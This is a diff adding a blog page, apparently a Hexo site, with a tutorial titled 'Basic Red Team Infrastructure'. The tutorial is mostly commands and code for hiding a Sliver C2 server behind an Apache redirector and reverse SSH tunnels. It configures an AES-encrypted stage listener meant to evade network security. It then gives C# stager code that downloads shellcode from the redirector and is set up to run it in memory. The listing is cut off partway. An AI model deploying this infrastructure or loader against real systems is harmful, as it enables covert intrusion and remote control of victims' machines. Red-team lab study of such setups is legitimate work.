@@ -1,0 +1,353 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Mercury</title>
+  <meta name="author" content="Mostafa Noureldin">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="Mercury"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Mercury</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>Mercury<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-bolt blink-slow" style="color:orange"></i>
+
+		Just Spark !
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/02/01/Basic-Red-Team-Infrastructure/" >Basic Red Team Infrastructure</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-02-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is about how to install a red team basic infrastructure using Apache and C2 framework from BishopFox. It is meant as the kickoff post for a series of tutorial posts on how to red teaming excercises from my experiments.</p>
+<h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><p>Through this post I will use a network setup like the one in the below image.</p>
+<img src="/2023/02/01/Basic-Red-Team-Infrastructure/image-20230131164406408.png" class="">
+
+<h2 id="Setup-Apache-Redirector"><a href="#Setup-Apache-Redirector" class="headerlink" title="Setup Apache Redirector"></a>Setup Apache Redirector</h2><p>Redirectors are used as a protection for team server, it shouldn’t reach team server directly in anyway. Traffic from victim corporate should land on the redirector then, redirector will decided to forward it as per the configured rules.</p>
+<p>In our case we are going to use Apache web server as the redirector, moreover we will use its’ redirection rules to forward our C2 connections.</p>
+<ol>
+<li><p>In real life scenarios, we should have a public server with valid certificate and domain name, it may also host any fake web site.</p>
+</li>
+<li><p>As we are using local lab, we will add it to local hosts file or to local DNS server. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 redirector-0</span><br><span class="line">127.0.0.1 fake-host.com</span><br><span class="line">192.168.24.138 fake-host.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Install Apache and required moduels.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install apache.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo apt install apache2</span><br><span class="line"></span><br><span class="line"><span class="comment"># install required modules.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo a2enmod ssl rewrite proxy proxy_http</span><br><span class="line"></span><br><span class="line"><span class="comment"># list default configuration.</span></span><br><span class="line">operator-0@redirector-0:~$ <span class="built_in">cd</span> /etc/apache2/sites-enabled/</span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jan 27 23:19 ./</span><br><span class="line">drwxr-xr-x 8 root root 4096 Jan 27 23:19 ../</span><br><span class="line">lrwxrwxrwx 1 root root   35 Jan 27 23:19 000-default.conf -&gt; ../sites-available/000-default.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove default configuration.</span></span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ sudo <span class="built_in">rm</span> 000-default.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># link default ssl configuration.</span></span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ sudo <span class="built_in">ln</span> -s ../sites-available/default-ssl.conf .</span><br><span class="line">operator-0@redirector-0:/etc/apache2/sites-enabled$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jan 27 23:27 ./</span><br><span class="line">drwxr-xr-x 8 root root 4096 Jan 27 23:19 ../</span><br><span class="line">lrwxrwxrwx 1 root root   35 Jan 27 23:27 default-ssl.conf -&gt; ../sites-available/default-ssl.conf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Redirecor should proof a valid SSL certificate to make evrything looks normal and benign.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate key pairs.</span></span><br><span class="line">operator-0@redirector-0:~$ openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key</span><br><span class="line">...+..+...+.+......+...+...+...+..+.......+...+..+.+.....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+...+...........+.+..+.........................+......+.....+....+..+.+.....+....+...+..+...................+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*...........+..+................+........................+.........+......+......+.....+...........................+...+.............+.....+.+........+......+.......+...+.....+.......+..+............+.+........+....+......+.........+...+..+.......+.....+...+.+..+....+...............+.......................+.+.........+..+...+......+....+...............+...............+.......................+...+.........+.+...........+....+.....+.......+..+.......+......+............+.....+...+....+...+..+....+..+...+....+.....+.+......+..............+..........+........................+..+.+............+.....+...+............................+.....................+.....+....+...........+..........+......+...+..+.........+.+.........+...+...............+...+..+.+.........+...+...............+.....+...+......+.........+....+...........+......+...+.......+...+.....+......+..........+..+...+..........+......+......+..+...............+...+....+.....+.............+..+...............+...+......+.......+...+.....+......+.+..+.+........................+..+.+.........+.....+...................+...........+..................+.+..+.......+.....................+..+...+......+.............+..+....+...........+...+.+..+............+...+...............+....+...+.....+.......+...........+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">.....+.........+......+......+..+...+.......+...+..+.......+........+.+.....+.......+.....+.......+..+....+..+...+......+....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+.........+..................+...+......+...+.+.........+.....+......+.......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+......+......+.................+...+.........+.+...........................+..+...+...........................+.+...+...........+.............+...+..............+...............+......+.........+...+...+...+....+.....+...............+......+......+..........+...+.....+......+...............+......+....+.....................+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter <span class="string">&#x27;.&#x27;</span>, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:EG</span><br><span class="line">State or Province Name (full name) [Some-State]:Cairo</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Fake Corp</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:fake-host.com</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>These two steps are only required if we have a valid public server.</p>
+</li>
+<li><p>Mainly, it opt for a new signed certificate using certbot.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ openssl req -new -key private.key -out fake-host.csr</span><br><span class="line">operator-0@redirector-0:~$ certbot certonly -d fake-host.com --apache --register-unsafely-without-email --agree-tos</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>As, we are working on a lab, we will just use the early generated keys.</p>
+</li>
+<li><p>Add the keys to Apache configurations.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># copy keys to the setup locations.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo <span class="built_in">cp</span> public.crt /etc/ssl/certs/</span><br><span class="line">operator-0@redirector-0:~$ sudo <span class="built_in">cp</span> private.key /etc/ssl/private/</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit Apache config</span></span><br><span class="line">operator-0@redirector-0:~$ nano /etc/apache2/sites-enabled/default-ssl.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># edit keys entries to refer to the generated keys.</span></span><br><span class="line">operator-0@redirector-0:~$ grep -oE <span class="string">&quot;SSLCertificate[K]?[e]?[y]?File.*/.*&quot;</span> /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">SSLCertificateFile	/etc/ssl/certs/public.crt</span><br><span class="line">SSLCertificateKeyFile	/etc/ssl/private/private.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># disable peer certificate check - c2 server listener self signed certificate.</span></span><br><span class="line">operator-0@redirector-0:~$ grep <span class="string">&quot;SSLProxyCheckPeerCN&quot;</span> /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">                SSLProxyCheckPeerCN off</span><br><span class="line"></span><br><span class="line"><span class="comment"># restart Apache to reflect the new configurarions.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo systemctl restart apache2.service </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Check the added certificate.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ curl --insecure -vvI https://192.168.24.138 2&gt;&amp;1 | awk <span class="string">&#x27;BEGIN &#123; cert=0 &#125; /^\* SSL connection/ &#123; cert=1 &#125; /^\*/ &#123; if (cert) print &#125;&#x27;</span></span><br><span class="line">* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384</span><br><span class="line">* ALPN, server accepted to use http/1.1</span><br><span class="line">* Server certificate:</span><br><span class="line">*  subject: C=EG; ST=Cairo; O=Fake Corp; CN=fake-host.com</span><br><span class="line">*  start <span class="built_in">date</span>: Jan 28 00:12:00 2023 GMT</span><br><span class="line">*  expire <span class="built_in">date</span>: Jan 28 00:12:00 2024 GMT</span><br><span class="line">*  issuer: C=EG; ST=Cairo; O=Fake Corp; CN=fake-host.com</span><br><span class="line">*  SSL certificate verify result: self-signed certificate (18), continuing anyway.</span><br><span class="line">* TLSv1.2 (OUT), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span><br><span class="line">* old SSL session ID is stale, removing</span><br><span class="line">* TLSv1.2 (IN), TLS header, Supplemental data (23):</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">* Connection <span class="comment">#0 to host 192.168.24.138 left intact</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Enable htaccess, which can be used for traffic redirection.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">tail</span> -n 10 /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">        <span class="comment"># Enable htaccess </span></span><br><span class="line">		&lt;Directory /var/www/html/&gt;</span><br><span class="line">			 Options Indexes FollowSymLinks MultiViews</span><br><span class="line">			 AllowOverride All</span><br><span class="line">             Require all granted</span><br><span class="line">        &lt;/Directory&gt;</span><br><span class="line">	&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Enable reverse proxy.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ sudo nano /etc/apache2/sites-enabled/default-ssl.conf</span><br><span class="line">operator-0@redirector-0:~$ <span class="built_in">head</span> -n 35 /etc/apache2/sites-enabled/default-ssl.conf | <span class="built_in">tail</span> -n 10</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># Enable reverse proxy over ssl                </span></span><br><span class="line">                SSLProxyEngine on</span><br><span class="line">                </span><br><span class="line">                SSLProxyCheckPeerCN off</span><br><span class="line">		<span class="comment">#   A self-signed (snakeoil) certificate can be created by installing</span></span><br><span class="line">		<span class="comment">#   the ssl-cert package. See</span></span><br><span class="line">		<span class="comment">#   /usr/share/doc/apache2/README.Debian.gz for more info.</span></span><br><span class="line">		<span class="comment">#   If both key and certificate are stored in the same file, only the</span></span><br><span class="line">		<span class="comment">#   SSLCertificateFile directive is needed.</span></span><br><span class="line">operator-0@redirector-0:~$ sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Since redirector should have direct access to our team server, the connection should be done through reverse SSH tunnle from the team server.</p>
+</li>
+<li><p>There should be two rules as follow.</p>
+<ol>
+<li>One rule used to download the payload using a stager, this was mainly configured in Sliver C2 by sending a request URI that ends with “.woff”.</li>
+<li>Another rule used in session establishment and termination which should serve HTTP requests that has URI which ends with one of js, html, php, and png.</li>
+</ol>
+</li>
+<li><p>Add Apache redirect rules.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">operator-0@redirector-0:~$ <span class="built_in">cat</span> /var/www/html/.htaccess</span><br><span class="line">RewriteEngine on</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; <span class="string">&quot;.*\.(js|html|php|png)$&quot;</span></span><br><span class="line">RewriteRule .* https://localhost:9443%&#123;REQUEST_URI&#125; [P]</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; <span class="string">&quot;.*\.woff$&quot;</span></span><br><span class="line">RewriteRule .* https://localhost:8443%&#123;REQUEST_URI&#125; [P]</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="SSH-tunnel-from-C2-server-to-redirector-machine"><a href="#SSH-tunnel-from-C2-server-to-redirector-machine" class="headerlink" title="SSH tunnel from C2 server to redirector machine."></a>SSH tunnel from C2 server to redirector machine.</h2><p>Since the redirector should only reach the team server over reverse SSH tunnle, let’s open two reverse tunnle serving our stager and sessions.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(kali~🔥~kali)-[~]$ ssh -N -R 8443:localhost:8443 -i operator-0 operator-0@192.168.24.138          255 ⨯</span><br><span class="line">Warning: Identity file operator-0 not accessible: No such file or directory.</span><br><span class="line">operator-0@192.168.24.138<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">#########</span></span><br><span class="line"><span class="string">(kali~🔥~kali)-[~]$ ssh -N -R 9443:localhost:443 -i operator-0 operator-0@192.168.24.138 </span></span><br><span class="line"><span class="string">Warning: Identity file operator-0 not accessible: No such file or directory.</span></span><br><span class="line"><span class="string">operator-0@192.168.24.138&#x27;</span>s password: </span><br></pre></td></tr></table></figure>
+
+<h2 id="Team-Server-Sliver-C2"><a href="#Team-Server-Sliver-C2" class="headerlink" title="Team Server - Sliver C2"></a>Team Server - Sliver C2</h2><ol>
+<li><p>Now, I won’t give too much about Sliver c2, the setup should be pretty much similar to any tool, and there is a quit good kick starter on its github page.</p>
+</li>
+<li><p>First, let’s create a new profile to server for the stager.</p>
+</li>
+<li><p>The profile should point to the redirector IP address as it will be the victim facing target.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; <span class="comment"># profiles new --http  &lt;redirector IP&gt; --skip-symbols --format shellcode --arch amd64 win64</span></span><br><span class="line">sliver &gt; profiles new --http  192.168.24.138 --skip-symbols --format shellcode --<span class="built_in">arch</span> amd64 win64</span><br><span class="line"></span><br><span class="line">[*] Saved new implant profile win64</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>We will use our https listener, so we can add the same certificate we used in redirector to keep everything consistent.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># we will use </span></span><br><span class="line">sliver &gt; https --cert ./public.pem --key ./private.pem</span><br><span class="line"></span><br><span class="line">[*] Starting HTTPS :443 listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">sliver &gt; <span class="built_in">jobs</span> </span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port </span><br><span class="line">==== ======= ========== ======</span><br><span class="line"> 2    https   tcp        443  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>We will create a stager that also listens on httpsm, it is prefered to be compressed and encrypted to be small in size and to potentially evad network security.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; <span class="comment"># keep the IP of stager pointing to the C2, but change it on the stager agent to point to the redirector.</span></span><br><span class="line">sliver &gt; stage-listener --url https://192.168.24.128:8443 --profile win64  --compress gzip --aes-encrypt-key D(G+KbPeShVmYq3t6v9y<span class="variable">$B</span>&amp;E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV</span><br><span class="line"></span><br><span class="line">[*] No builds found <span class="keyword">for</span> profile win64, generating a new one</span><br><span class="line">[*] Job 9 (http) started</span><br><span class="line">[*] AES KEY: D(G+KbPeShVmYq3t6v9y<span class="variable">$B</span>&amp;E)H@McQfT</span><br><span class="line">[*] AES IV: 8y/B?E(G+KbPeShV</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Getting-Shell"><a href="#Getting-Shell" class="headerlink" title="Getting Shell"></a>Getting Shell</h2><ol>
+<li><p>As everything should be ready by now, run the below stager targetting the redirector IP for the test.woff file.</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.IO.Compression;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Sliver_stager</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> AESKey = <span class="string">&quot;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> AESIV = <span class="string">&quot;8y/B?E(G+KbPeShV&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> url = <span class="string">&quot;https://192.168.24.138/test.woff&quot;</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DownloadAndExecute</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; <span class="literal">true</span>;</span><br><span class="line">            System.Net.WebClient client = <span class="keyword">new</span> System.Net.WebClient();</span><br><span class="line">            <span class="built_in">byte</span>[] shellcode = client.DownloadData(url);</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//byte[] actual = null;</span></span><br><span class="line"></span><br><span class="line">            List&lt;<span class="built_in">byte</span>&gt; l = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt; &#123; 